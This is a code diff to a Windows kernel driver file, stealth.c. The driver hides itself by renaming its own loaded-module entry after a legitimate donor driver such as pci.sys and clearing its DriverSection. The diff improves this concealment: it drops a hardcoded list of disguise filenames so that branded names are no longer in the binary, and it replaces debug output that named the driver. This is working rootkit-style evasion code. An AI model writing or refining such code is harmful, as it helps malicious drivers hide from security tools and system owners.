@@ -1,4 +1,4 @@
-/* stealth.c -- module self-concealment for THE_CHAMBER.
+/* stealth.c -- module self-concealment.
  *
  * Phase 1.4: do NOT unlink from PsLoadedModuleList.
  * -------------------------------------------------
@@ -92,23 +92,15 @@ static BOOLEAN name_matches(PKLDR_DATA_TABLE_ENTRY e, const WCHAR *want) {
     return TRUE;
 }
 
-/* Match our driver by comparing BaseDllName against known aliases.
- * The release launcher will have renamed the binary at install time so
- * only one of these should fire; the extras are defensive against stale
- * installs. */
-static BOOLEAN is_our_module(PKLDR_DATA_TABLE_ENTRY e) {
-    static const WCHAR *names[] = {
-        L"winhvmon.sys",
-        L"amdsvcnt.sys",
-        L"AmdPPM.sys",
-        L"svchvdd.sys",
-        L"IntcSvcLsrv.sys",
-    };
-    SIZE_T i;
-    for (i = 0; i < sizeof(names)/sizeof(names[0]); i++) {
-        if (name_matches(e, names[i])) return TRUE;
-    }
-    return FALSE;
+/* Phase 1.7: match our own KLDR entry by DllBase against the DriverObject's
+ * DriverStart. The loader populates both to the same address (the image
+ * load base) when it maps us, so this match is independent of whatever
+ * filename the launcher chose at install time. Avoiding a hardcoded
+ * WCHAR alias table also keeps every per-install branded filename out of
+ * the release binary. */
+static BOOLEAN is_our_module(PKLDR_DATA_TABLE_ENTRY e, PDRIVER_OBJECT drv) {
+    if (!e || !drv) return FALSE;
+    return (e->DllBase == drv->DriverStart);
 }
 
 /* Donor candidates in preference order. pci.sys is first because it is
@@ -118,7 +110,9 @@ static BOOLEAN is_our_module(PKLDR_DATA_TABLE_ENTRY e) {
  * installations). All three donors are kernel-image modules with
  * stable UNICODE_STRING buffers; reading them after rename is safe for
  * as long as the donor itself stays loaded, and all three are
- * non-unloadable on normal builds. */
+ * non-unloadable on normal builds. These donor names are legitimate OS
+ * component names and never match the driver's own branded identity, so
+ * they do not count as a brand leak in the release binary. */
 static BOOLEAN is_donor_module(PKLDR_DATA_TABLE_ENTRY e) {
     static const WCHAR *donors[] = {
         L"pci.sys",
@@ -158,11 +152,11 @@ NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
 
     head = &PsLoadedModuleList;
 
-    /* First pass: find our own KLDR_DATA_TABLE_ENTRY. */
+    /* First pass: find our own KLDR_DATA_TABLE_ENTRY by DllBase match. */
     for (cur = head->Flink; cur != head; cur = cur->Flink) {
         PKLDR_DATA_TABLE_ENTRY e =
             CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-        if (is_our_module(e)) {
+        if (is_our_module(e, drv)) {
             our_entry = e;
             break;
         }
@@ -231,9 +225,7 @@ NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
         drv->DriverSection             = NULL;
     }
 
-    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL,
-               "WinHvMon: stealth applied (renamed; donor %wZ)\n",
-               &donor->BaseDllName);
+    CHAMBER_LOG("stealth applied (renamed; donor %wZ)\n", &donor->BaseDllName);
     return STATUS_SUCCESS;
 }
 
@@ -255,7 +247,6 @@ NTSTATUS stealth_revert(PDRIVER_OBJECT drv) {
         drv->DriverSection = g_saved_driver_section;
     }
 
-    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL,
-               "WinHvMon: stealth reverted\n");
+    CHAMBER_LOG("stealth reverted\n");
     return STATUS_SUCCESS;
 }
